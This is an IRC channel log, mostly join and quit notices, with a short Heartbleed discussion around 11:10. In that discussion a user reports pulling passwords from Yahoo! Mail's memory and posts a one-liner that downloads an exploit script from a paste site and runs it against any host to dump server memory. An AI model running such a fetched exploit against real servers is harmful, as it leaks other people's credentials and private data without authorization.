[00:00:05] *** Joins: carllerche (carllerche@moz-2B516F15.hsd1.or.comcast.net)
[00:37:56] *** Joins: alan_and_ (alan_andra@moz-B2C44770.car1.sanfrancisco1.level3.net)
[00:39:08] *** Quits: alan_andrade (alan_andra@moz-B2C44770.car1.sanfrancisco1.level3.net) (Ping timeout)
[00:42:30] *** Quits: alan_and_ (alan_andra@moz-B2C44770.car1.sanfrancisco1.level3.net) (Ping timeout)
[00:45:34] *** Quits: carllerche (carllerche@moz-2B516F15.hsd1.or.comcast.net) (Quit: carllerche)
[01:19:17] *** Quits: sunfish (chatzilla@moz-62518563.mtv2.mozilla.com) (Ping timeout)
[02:17:49] *** Joins: carllerche (carllerche@moz-CA3FF5F1.hsd1.or.comcast.net)
[02:19:31] *** Quits: carllerche (carllerche@moz-CA3FF5F1.hsd1.or.comcast.net) (Ping timeout)
[02:29:56] *** Joins: erickt (erickt@B91004E7.345B955C.2321E71E.IP)
[02:38:55] *** Joins: carllerche (carllerche@moz-CA3FF5F1.hsd1.or.comcast.net)
[02:42:17] *** Joins: alan_andrade (alan_andra@moz-B2C44770.car1.sanfrancisco1.level3.net)
[02:44:03] *** Quits: alan_andrade (alan_andra@moz-B2C44770.car1.sanfrancisco1.level3.net) (Ping timeout)
[03:02:52] *** Joins: alan_andrade (alan_andra@moz-8862F69E.hsd1.ca.comcast.net)
[04:38:34] *** Quits: kmc (keegan@moz-2C6EE959.compute-1.amazonaws.com) (Quit: leaving)
[04:39:22] *** Quits: carllerche (carllerche@moz-CA3FF5F1.hsd1.or.comcast.net) (Quit: carllerche)
[04:44:27] *** Joins: alan_and_ (alan_andra@moz-B2C44770.car1.sanfrancisco1.level3.net)
[04:46:10] *** Quits: alan_and_ (alan_andra@moz-B2C44770.car1.sanfrancisco1.level3.net) (Ping timeout)
[05:06:28] *** Joins: carllerche (carllerche@moz-CA3FF5F1.hsd1.or.comcast.net)
[05:30:16] *** Joins: eddyb (eddy@717B0165.D51DAF03.FB866788.IP)
[05:40:44] *** Quits: eddyb (eddy@717B0165.D51DAF03.FB866788.IP) (Ping timeout)
[05:45:13] *** Joins: eddyb (eddy@717B0165.D51DAF03.FB866788.IP)
[05:47:25] *** Quits: eddyb (eddy@717B0165.D51DAF03.FB866788.IP) (Ping timeout)
[05:48:51] *** Joins: eddyb (eddy@717B0165.D51DAF03.FB866788.IP)
[06:05:44] *** Quits: erickt (erickt@B91004E7.345B955C.2321E71E.IP) (Ping timeout)
[06:44:48] *** flaper87|afk is now known as flaper87
[07:18:50] *** Quits: ChrisMorgan (chris@moz-8DCBEA52.vic.adsl.internode.on.net) (Ping timeout)
[07:22:57] *** Joins: alan_and_ (alan_andra@moz-B2C44770.car1.sanfrancisco1.level3.net)
[07:24:43] *** Quits: alan_and_ (alan_andra@moz-B2C44770.car1.sanfrancisco1.level3.net) (Ping timeout)
[07:26:16] *** flaper87 is now known as flaper87|afk
[07:29:36] *** Quits: carllerche (carllerche@moz-CA3FF5F1.hsd1.or.comcast.net) (Quit: carllerche)
[07:34:17] *** Quits: tiffany (lymia@moz-9AFBAEEB.lymia.me.uk) (Input/output error)
[07:34:41] *** Joins: tiffany (lymia@moz-9AFBAEEB.lymia.me.uk)
[07:35:11] *** Quits: eddyb (eddy@717B0165.D51DAF03.FB866788.IP) (Ping timeout)
[07:39:48] *** Quits: tiffany (lymia@moz-9AFBAEEB.lymia.me.uk) (Broken pipe)
[07:40:11] *** Joins: tiffany (lymia@moz-9AFBAEEB.lymia.me.uk)
[08:36:26] *** Joins: eddyb (eddy@9C8921DE.97C485DB.D608C900.IP)
[08:41:50] *** Quits: johnsoft (johnsoft@moz-7E09A266.neo.res.rr.com) (Ping timeout)
[08:42:23] *** Joins: johnsoft (johnsoft@moz-7E09A266.neo.res.rr.com)
[08:51:13] *** Quits: eddyb (eddy@9C8921DE.97C485DB.D608C900.IP) (Ping timeout)
[09:24:27] *** Joins: alan_and_ (alan_andra@moz-B2C44770.car1.sanfrancisco1.level3.net)
[09:26:11] *** Quits: alan_and_ (alan_andra@moz-B2C44770.car1.sanfrancisco1.level3.net) (Ping timeout)
[09:39:50] *** Quits: alan_andrade (alan_andra@moz-8862F69E.hsd1.ca.comcast.net) (Input/output error)
[09:40:16] *** Joins: alan_andrade (alan_andra@moz-8862F69E.hsd1.ca.comcast.net)
[09:42:03] *** Quits: alan_andrade (alan_andra@moz-8862F69E.hsd1.ca.comcast.net) (Ping timeout)
[09:53:04] *** flaper87|afk is now known as flaper87
[09:58:39] *** Quits: fmtq (fmt@moz-5769BD38.static.tpgi.com.au) (Ping timeout)
[10:05:23] *** Quits: KokaKiwi (kokakiwi@moz-D674DAC6.kokakiwi.net) (Ping timeout)
[10:06:16] *** Joins: KokaKiwi (kokakiwi@moz-D674DAC6.kokakiwi.net)
[10:07:28] *** Joins: fmtq (fmt@moz-5769BD38.static.tpgi.com.au)
[10:25:04] *** Quits: canhtak (canhtak@moz-7FC55BCE.wl.t.ulaval.ca) (Quit: canhtak)
[11:09:54] *** Joins: eddyb (eddy@9C8921DE.97C485DB.D608C900.IP)
[11:10:00] <eddyb> http://filippo.io/Heartbleed/ this is fun
[11:10:23] <Yurume> eddyb: even openssl.org was once vulnerable.
[11:10:54] <eddyb> someone should've totally hijacked it to keep the bug alive
[11:10:55] *** Joins: whitglint (uid15486@moz-31ABA2C0.irccloud.com)
[11:11:15] <Yurume> eddyb: Yahoo! Mail, for example, is still vulnerable if I recall correctly.
[11:11:31] <Yurume> it did give some passwords when I've tried multiple times
[11:11:43] <Yurume> so {eaves,jaw}dropping.
[11:12:01] * huon tests his banks
[11:13:27] <Yurume> for interested: wget http://ix.io/byF -O test.py; python test.py HOST [--port=PORT] | xxd -r | less gives a dumped memory
[11:13:45] <Yurume> (you are fully responsible for using this, as usual)
[11:19:13] <eddyb> http://thecodelesscode.com/case/139 *sigh*
[11:21:32] <eddyb> https://codegolf.stackexchange.com/questions/25347/survival-game-create-your-wolf haha this is fun. I should play codegolf
[11:22:14] <huon> :'( one bank down
[11:23:51] <huon> and the other one isn't vulnerable
[11:24:00] <huon> 1 from 2 ain't bad (... kinda.)
[11:25:36] <Yurume> huon: check it multiple times, the online checker occasionally returns false negatives
[11:26:17] * huon tries
[11:26:47] <huon> passed 2/6
[11:26:56] * huon doesn't know what to believe
[11:27:11] <Yurume> ultimately though, it is safe to assume that every website using OpenSSL 1.0.1 branch *right now* is or had been vulnerable since 2012.
[11:27:44] <Yurume> (there are some conservative sysadmins that use 0.9.8 to this day, which should be relieved now)
[11:28:22] * huon hopes that the two groups who discovered the vulnerability recently were the first to find it
[11:28:36] <Yurume> I strongly believe it is not the case :(
[12:10:36] *** Quits: johnsoft (johnsoft@moz-7E09A266.neo.res.rr.com) (Ping timeout)
[12:10:48] *** Joins: johnsoft (johnsoft@moz-7E09A266.neo.res.rr.com)
[12:26:47] *** Joins: alan_andrade (alan_andra@moz-B2C44770.car1.sanfrancisco1.level3.net)
[12:28:33] *** Quits: alan_andrade (alan_andra@moz-B2C44770.car1.sanfrancisco1.level3.net) (Ping timeout)
[12:37:25] *** Joins: alan_andrade (alan_andra@moz-8862F69E.hsd1.ca.comcast.net)
[12:39:12] *** Quits: alan_andrade (alan_andra@moz-8862F69E.hsd1.ca.comcast.net) (Ping timeout)
[13:18:05] *** Quits: esummers (esummers@moz-3B015C90.wi.res.rr.com) (Quit: Computer has gone to sleep.)
[13:18:55] * flaper87 loves coffee, soooo much!
[13:27:35] *** Joins: alan_andrade (alan_andra@moz-B2C44770.car1.sanfrancisco1.level3.net)
[13:29:17] *** Quits: alan_andrade (alan_andra@moz-B2C44770.car1.sanfrancisco1.level3.net) (Ping timeout)
[13:57:53] *** Joins: _eddyb_ (eddy@9C8921DE.97C485DB.D608C900.IP)
[13:58:26] *** Quits: eddyb (eddy@9C8921DE.97C485DB.D608C900.IP) (Ping timeout)
[13:59:02] *** _eddyb_ is now known as eddyb
[14:06:07] *** Quits: johnsoft (johnsoft@moz-7E09A266.neo.res.rr.com) (Ping timeout)
[14:31:51] *** Joins: canhtak (canhtak@moz-7FC55BCE.wl.t.ulaval.ca)
[14:44:37] *** Quits: canhtak (canhtak@moz-7FC55BCE.wl.t.ulaval.ca) (Quit: canhtak)
[14:53:58] *** Joins: canhtak (canhtak@moz-7FC55BCE.wl.t.ulaval.ca)
[15:23:55] *** Joins: f_red (f_green@moz-6398EFDF.dclient.hispeed.ch)
[15:50:38] *** Quits: bjz (bjz@B398BE78.F804C29E.D35A31DF.IP) (Ping timeout)
[16:30:15] *** Quits: Havvy (Havvy@moz-4FE57F72.hsd1.wa.comcast.net) (Connection reset by peer)
[16:30:21] *** Joins: Havvy (Havvy@moz-4FE57F72.hsd1.wa.comcast.net)
[16:39:21] *** Joins: bjz (bjz@B398BE78.F804C29E.D35A31DF.IP)
[16:39:47] *** Quits: eddyb (eddy@9C8921DE.97C485DB.D608C900.IP) (Ping timeout)
[16:40:26] *** Joins: alan_andrade (alan_andra@moz-8862F69E.hsd1.ca.comcast.net)
[16:42:09] *** Quits: alan_andrade (alan_andra@moz-8862F69E.hsd1.ca.comcast.net) (Ping timeout)
[17:30:21] *** Joins: alan_andrade (alan_andra@moz-B2C44770.car1.sanfrancisco1.level3.net)
[17:32:01] *** Quits: alan_andrade (alan_andra@moz-B2C44770.car1.sanfrancisco1.level3.net) (Ping timeout)
[17:38:10] *** Joins: sunfish (chatzilla@moz-62518563.mtv2.mozilla.com)
[17:41:11] *** Joins: alan_and_ (alan_andra@moz-B2C44770.car1.sanfrancisco1.level3.net)
[17:43:17] *** Quits: alan_and_ (alan_andra@moz-B2C44770.car1.sanfrancisco1.level3.net) (Input/output error)
[17:43:45] *** Joins: alan_andrade (alan_andra@moz-B2C44770.car1.sanfrancisco1.level3.net)
[17:44:19] *** Joins: eddyb (eddy@717B0165.D51DAF03.FB866788.IP)
[17:45:28] *** Quits: alan_andrade (alan_andra@moz-B2C44770.car1.sanfrancisco1.level3.net) (Ping timeout)
[17:45:48] *** Joins: carllerche (carllerche@moz-CA3FF5F1.hsd1.or.comcast.net)
[17:49:41] *** Joins: alan_andrade (alan_andra@moz-B2C44770.car1.sanfrancisco1.level3.net)
[18:06:45] <eddyb> http://d24w6bsrhbeh9d.cloudfront.net/photo/aqmAgeQ_700b_v1.jpg
[18:16:39] *** Quits: carllerche (carllerche@moz-CA3FF5F1.hsd1.or.comcast.net) (Quit: carllerche)
[18:21:04] *** Joins: carllerche (carllerche@moz-CA3FF5F1.hsd1.or.comcast.net)
[18:32:22] *** Havvy is now known as Havvy|shower
[18:39:01] *** Quits: carllerche (carllerche@moz-CA3FF5F1.hsd1.or.comcast.net) (Quit: carllerche)
[18:53:02] *** Havvy|shower is now known as Havvy
[19:12:49] *** Joins: carllerche (carllerche@moz-CA3FF5F1.hsd1.or.comcast.net)
[19:38:20] *** Quits: carllerche (carllerche@moz-CA3FF5F1.hsd1.or.comcast.net) (Quit: carllerche)
[19:48:39] <eddyb> "just because we haven't cured cancer yet doesn't mean that eradicating smallpox wasn't a massive human medical advance"
[19:48:42] <eddyb> nice, pcwalton
[20:10:57] *** Joins: alan_andrade_ (alan_andra@moz-8862F69E.hsd1.ca.comcast.net)
[20:12:59] *** Quits: alan_andrade_ (alan_andra@moz-8862F69E.hsd1.ca.comcast.net) (Ping timeout)
[20:18:04] *** Quits: sunfish (chatzilla@moz-62518563.mtv2.mozilla.com) (Ping timeout)
[20:22:16] *** Quits: whitglint (uid15486@moz-31ABA2C0.irccloud.com) (Quit: Connection closed for inactivity)
[20:51:39] *** Quits: eddyb (eddy@717B0165.D51DAF03.FB866788.IP) (Ping timeout)
[21:05:01] *** Joins: carllerche (carllerche@moz-2B516F15.hsd1.or.comcast.net)
[21:24:19] *** Joins: sunfish (chatzilla@moz-62518563.mtv2.mozilla.com)
[21:46:42] *** Quits: sunfish (chatzilla@moz-62518563.mtv2.mozilla.com) (Input/output error)
[21:56:23] *** Joins: sunfish (chatzilla@moz-62518563.mtv2.mozilla.com)
[21:58:20] *** Quits: sunfish (chatzilla@moz-62518563.mtv2.mozilla.com) (Client exited)
[22:08:01] *** Joins: sunfish (chatzilla@moz-62518563.mtv2.mozilla.com)
[22:12:47] *** Joins: alan_andrade_ (alan_andra@moz-8862F69E.hsd1.ca.comcast.net)
[22:14:30] *** Quits: alan_andrade_ (alan_andra@moz-8862F69E.hsd1.ca.comcast.net) (Ping timeout)
[22:19:07] *** Quits: sunfish (chatzilla@moz-62518563.mtv2.mozilla.com) (Ping timeout)
[22:19:52] *** Joins: sunfish (chatzilla@moz-62518563.mtv2.mozilla.com)
[23:13:22] *** Joins: alan_andrade_ (alan_andra@moz-8862F69E.hsd1.ca.comcast.net)
[23:15:13] *** Quits: alan_andrade_ (alan_andra@moz-8862F69E.hsd1.ca.comcast.net) (Ping timeout)
[23:20:29] *** Joins: ChrisMorgan (chris@moz-8DCBEA52.vic.adsl.internode.on.net)
[23:22:17] *** Quits: ChrisMorgan (chris@moz-8DCBEA52.vic.adsl.internode.on.net) (Ping timeout)
[23:29:10] *** Quits: f_red (f_green@moz-6398EFDF.dclient.hispeed.ch) (Ping timeout)
[23:29:22] *** Joins: f_red (f_green@moz-6398EFDF.dclient.hispeed.ch)
[23:33:51] *** Quits: alan_andrade (alan_andra@moz-B2C44770.car1.sanfrancisco1.level3.net) (Input/output error)
[23:34:16] *** Joins: alan_andrade (alan_andra@moz-B2C44770.car1.sanfrancisco1.level3.net)
[23:36:00] *** Quits: alan_andrade (alan_andra@moz-B2C44770.car1.sanfrancisco1.level3.net) (Ping timeout)
[23:42:36] *** Joins: ChrisMorgan (chris@moz-8DCBEA52.vic.adsl.internode.on.net)
[23:43:27] *** flaper87 is now known as flaper87|afk
[23:59:48] *** Quits: ChrisMorgan (chris@moz-8DCBEA52.vic.adsl.internode.on.net) (Ping timeout)
